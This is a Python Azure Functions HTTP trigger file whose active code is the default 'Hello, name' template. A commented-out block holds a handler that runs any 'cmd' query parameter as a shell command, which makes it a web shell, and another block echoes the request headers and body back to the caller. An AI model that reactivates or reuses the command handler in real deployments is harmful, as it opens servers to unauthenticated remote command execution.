import logging
import json
import subprocess
import azure.functions as func

"""
def main(req: func.HttpRequest) -> func.HttpResponse:
    logging.info('Python HTTP trigger function processed a request.')
    cmd = req.params.get('cmd')
    output = subprocess.check_output(cmd, shell=True)
    return func.HttpResponse(output)
"""
"""
def main(req: func.HttpRequest) -> func.HttpResponse:
    logging.info('Python HTTP trigger function processed a request.')
    return func.HttpResponse(
        json.dumps({
            'method': req.method,
            'url': req.url,
            'headers': dict(req.headers),
            'params': dict(req.params),
            'get_body': req.get_body().decode()
        })
    )
"""

"""
import logging

import azure.functions as func
"""

def main(req: func.HttpRequest) -> func.HttpResponse:
    logging.info('Python HTTP trigger function processed a request.')

    name = req.params.get('name')
    if not name:
        try:
            req_body = req.get_json()
        except ValueError:
            pass
        else:
            name = req_body.get('name')

    if name:
        return func.HttpResponse(f"Hello, {name}. This HTTP triggered function executed successfully.")
    else:
        return func.HttpResponse(
             "This HTTP triggered function executed successfully. Pass a name in the query string or in the request body for a personalized response.",
             status_code=200
        )
